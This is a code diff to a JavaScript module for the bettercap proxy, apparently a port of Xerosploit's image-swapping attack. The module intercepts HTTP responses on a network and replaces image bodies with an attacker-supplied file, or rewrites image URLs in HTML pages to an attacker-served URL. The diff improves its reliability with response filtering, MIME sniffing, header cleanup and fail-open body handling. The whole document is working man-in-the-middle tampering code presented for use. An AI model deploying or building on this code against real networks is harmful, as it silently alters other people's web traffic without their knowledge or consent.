@@ -12,8 +12,9 @@
 // two complementary strategies:
 //
 //   1. Image responses (Content-Type image/*): the body is swapped for
-//      XE_IMAGE_FILE, with the Content-Type retargeted to the file's type.
-//      This is the primary, self-contained mode.
+//      XE_IMAGE_FILE, with the Content-Type derived from the replacement file
+//      (magic-byte sniff first, then filename extension, else
+//      application/octet-stream).  This is the primary, self-contained mode.
 //
 //   2. HTML image URLs: if XE_IMAGE_URL is provided, every quoted image URL in
 //      text/html is rewritten to it (the faithful v1 behaviour when a served
@@ -23,8 +24,15 @@
 //   XE_IMAGE_FILE  absolute path of the replacement image (primary)
 //   XE_IMAGE_URL   optional URL of a served replacement image (HTML rewrite)
 //
-// Strict passthrough: responses that are neither image/* nor text/html are left
-// untouched, and any error is swallowed so proxied traffic is never broken.
+// FAIL-OPEN BODY DISCIPLINE (bettercap v2): res.ReadBody() flips bettercap's
+// "body modified" flag, so after the body has been read this module MUST write
+// a body back or bettercap emits an EMPTY response.  The decision to rewrite
+// is therefore made from method/status/headers/content-type alone; only then
+// is the body read exactly once.  Every exit path after that read sets the
+// body and a Content-Length equal to the UTF-8 byte length of the string it
+// writes: either the mutated bytes, or the byte-exact original on failure.
+// GET + status 200 + no Range/Content-Range only; RANGE/206 responses are never
+// touched.  A response this module does not handle is left byte-identical.
 //
 // Released under the GNU GPLv3.
 // Original Xerosploit: LionSec / Neodrix.
@@ -53,6 +61,55 @@ function xeByteLen(s) {
     return n;
 }
 
+// Case-insensitive read from a bettercap header map (req.Headers / res.Headers).
+function xeGetHeader(headers, name) {
+    if (!headers) { return null; }
+    var want = ("" + name).toLowerCase();
+    var key;
+    for (key in headers) {
+        if (("" + key).toLowerCase() === want) {
+            var value = headers[key];
+            if (value === null || value === undefined) { return null; }
+            return value;
+        }
+    }
+    return null;
+}
+
+// Decide, from method/status/headers ALONE (no body read), whether this
+// response may be rewritten as a full-body 200.
+function xeSkipResponse(req, res) {
+    if (!req || req.Method !== "GET") { return true; }
+    if (!res || res.Status !== 200) { return true; }
+    if (xeGetHeader(req.Headers, "Range")) { return true; }
+    if (xeGetHeader(res.Headers, "Content-Range")) { return true; }
+    return false;
+}
+
+var XE_STALE_HEADERS = [
+    "Content-Range", "Accept-Ranges", "ETag", "Last-Modified", "Digest",
+    "Content-MD5", "Content-Disposition", "Content-Encoding", "Transfer-Encoding"
+];
+
+function xeWriteBody(res, body) {
+    res.Body = body;
+    if (typeof res.SetHeader === "function") {
+        res.SetHeader("Content-Length", "" + xeByteLen(body));
+    }
+}
+
+function xeReplaceBody(res, body, contentType) {
+    if (typeof res.RemoveHeader === "function") {
+        for (var i = 0; i < XE_STALE_HEADERS.length; i++) {
+            res.RemoveHeader(XE_STALE_HEADERS[i]);
+        }
+    }
+    if (contentType && typeof res.SetHeader === "function") {
+        res.SetHeader("Content-Type", contentType);
+    }
+    xeWriteBody(res, body);
+}
+
 function xeReadFile(path) {
     if (!path || typeof readFile !== "function") { return null; }
     try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
@@ -64,28 +121,53 @@ function xeReadBody(res) {
     return res.Body;
 }
 
-function xeSetBody(res, body) {
-    res.Body = body;
-    if (typeof res.SetHeader === "function") {
-        res.SetHeader("Content-Length", "" + xeByteLen(body));
-    }
-    if (typeof res.RemoveHeader === "function") {
-        res.RemoveHeader("Content-Encoding");
-        res.RemoveHeader("Transfer-Encoding");
-    }
+// Lowercase extension of a path/filename, query and fragment stripped.
+function xeFileExtension(path) {
+    if (!path) { return ""; }
+    var p = ("" + path).toLowerCase();
+    var q = p.indexOf("?");
+    if (q !== -1) { p = p.substring(0, q); }
+    var h = p.indexOf("#");
+    if (h !== -1) { p = p.substring(0, h); }
+    var slash = p.lastIndexOf("/");
+    if (slash !== -1) { p = p.substring(slash + 1); }
+    var dot = p.lastIndexOf(".");
+    if (dot === -1 || dot === p.length - 1) { return ""; }
+    return p.substring(dot + 1);
 }
 
-// Best-effort MIME type for the replacement image, from its file extension.
-function xeImageMime(path) {
-    var p = ("" + (path || "")).toLowerCase();
-    if (p.indexOf(".png") !== -1) { return "image/png"; }
-    if (p.indexOf(".jpg") !== -1 || p.indexOf(".jpeg") !== -1) { return "image/jpeg"; }
-    if (p.indexOf(".gif") !== -1) { return "image/gif"; }
-    if (p.indexOf(".webp") !== -1) { return "image/webp"; }
-    if (p.indexOf(".bmp") !== -1) { return "image/bmp"; }
-    if (p.indexOf(".svg") !== -1) { return "image/svg+xml"; }
-    if (p.indexOf(".ico") !== -1) { return "image/x-icon"; }
+// MIME type inferred from the replacement file's magic bytes, or null.
+function xeSniffImageMime(data) {
+    if (typeof data !== "string" || data.length < 4) { return null; }
+    var b0 = data.charCodeAt(0) & 0xFF, b1 = data.charCodeAt(1) & 0xFF,
+        b2 = data.charCodeAt(2) & 0xFF, b3 = data.charCodeAt(3) & 0xFF;
+    if (b0 === 0x89 && b1 === 0x50 && b2 === 0x4E && b3 === 0x47) { return "image/png"; }
+    if (b0 === 0xFF && b1 === 0xD8 && b2 === 0xFF) { return "image/jpeg"; }
+    if (b0 === 0x47 && b1 === 0x49 && b2 === 0x46 && b3 === 0x38) { return "image/gif"; }
+    if (data.length >= 12 &&
+        data.charCodeAt(0) === 0x52 && data.charCodeAt(1) === 0x49 &&
+        data.charCodeAt(2) === 0x46 && data.charCodeAt(3) === 0x46 &&
+        data.charCodeAt(8) === 0x57 && data.charCodeAt(9) === 0x45 &&
+        data.charCodeAt(10) === 0x42 && data.charCodeAt(11) === 0x50) {
+        return "image/webp";
+    }
     return null;
+}
+
+// Content type for the replacement image: magic bytes win, then the filename
+// extension, then application/octet-stream.  Never hard-coded to .png.
+function xeImageMime(path, data) {
+    var sniffed = xeSniffImageMime(data);
+    if (sniffed) { return sniffed; }
+    var ext = xeFileExtension(path);
+    if (ext === "png") { return "image/png"; }
+    if (ext === "jpg" || ext === "jpeg") { return "image/jpeg"; }
+    if (ext === "gif") { return "image/gif"; }
+    if (ext === "webp") { return "image/webp"; }
+    if (ext === "bmp") { return "image/bmp"; }
+    if (ext === "svg") { return "image/svg+xml"; }
+    if (ext === "ico") { return "image/x-icon"; }
+    return "application/octet-stream";
 }
 
 // Quoted image URLs inside HTML, mirroring v1's regex on (png|jpg|...|svg).
@@ -98,38 +180,60 @@ function onLoad() {
 }
 
 function onResponse(req, res) {
-    try {
-        if (!res || typeof res.ContentType !== "string") { return; }
-        var ct = res.ContentType.toLowerCase();
-        var path = (req && req.Path) ? req.Path : "";
+    if (!res || typeof res.ContentType !== "string") { return; }
 
-        // --- HTML: rewrite image URLs when a served URL was provided (v1 path) ---
-        if (ct.indexOf("text/html") === 0) {
-            var imgUrl = (typeof XE_IMAGE_URL === "undefined") ? null : XE_IMAGE_URL;
-            if (!imgUrl) { return; }                                     // passthrough
-            var html = xeReadBody(res);
-            if (typeof html !== "string" || html.length === 0) { return; }
+    // Decide from headers/URL only; a skipped response is never read or mutated.
+    if (xeSkipResponse(req, res)) { return; }
+
+    var ct = res.ContentType.toLowerCase();
+    var path = (req && req.Path) ? req.Path : "";
+
+    // --- HTML: rewrite image URLs when a served URL was provided (v1 path) ---
+    if (ct.indexOf("text/html") === 0) {
+        var imgUrl = (typeof XE_IMAGE_URL === "undefined") ? null : XE_IMAGE_URL;
+        if (!imgUrl) { return; }                                         // passthrough, never read
+
+        var html = null;
+        try {
+            html = xeReadBody(res);
+            if (typeof html !== "string") { return; }
             var rewritten = html.replace(XE_IMG_RE, function (m, quote) { return quote + imgUrl + quote; });
             if (rewritten !== html) {
                 xeLog("rewriting image URLs in " + path + " to " + imgUrl);
-                xeSetBody(res, rewritten);
+                xeReplaceBody(res, rewritten, res.ContentType);
+            } else {
+                xeWriteBody(res, html);
             }
-            return;
+        } catch (e) {
+            xeWarn("onResponse failed: " + e);
+            if (typeof html === "string") {
+                xeWriteBody(res, html);                                  // fail-open: exact original bytes
+            }
         }
+        return;
+    }
 
-        // --- Image response: swap the bytes for XE_IMAGE_FILE (primary mode) ---
-        if (ct.indexOf("image/") === 0) {
-            var imgFile = (typeof XE_IMAGE_FILE === "undefined") ? null : XE_IMAGE_FILE;
-            if (!imgFile) { xeWarn("XE_IMAGE_FILE is not set; passing through"); return; }
-            var payload = xeReadFile(imgFile);
-            if (payload === null || payload === "") { xeWarn("empty image file: " + imgFile); return; }
+    // --- Image response: swap the bytes for XE_IMAGE_FILE (primary mode) ---
+    if (ct.indexOf("image/") === 0) {
+        var imgFile = (typeof XE_IMAGE_FILE === "undefined") ? null : XE_IMAGE_FILE;
+        if (!imgFile) { xeWarn("XE_IMAGE_FILE is not set; passing through"); return; }
+
+        var payload = xeReadFile(imgFile);
+        if (payload === null || payload === "") { xeWarn("empty image file: " + imgFile); return; }
+
+        var original = null;
+        try {
+            original = xeReadBody(res);
+            if (typeof original !== "string") { return; }
+
             xeLog("replacing image " + path + " with " + imgFile);
-            var mime = xeImageMime(imgFile);
-            if (mime && typeof res.SetHeader === "function") { res.SetHeader("Content-Type", mime); }
-            xeSetBody(res, payload);
-            return;
+            xeReplaceBody(res, payload, xeImageMime(imgFile, payload));
+        } catch (e) {
+            xeWarn("onResponse failed: " + e);
+            if (typeof original === "string") {
+                xeWriteBody(res, original);                              // fail-open: exact original bytes
+            }
         }
-    } catch (e) {
-        xeWarn("onResponse failed: " + e);                               // never break traffic
+        return;
     }
 }
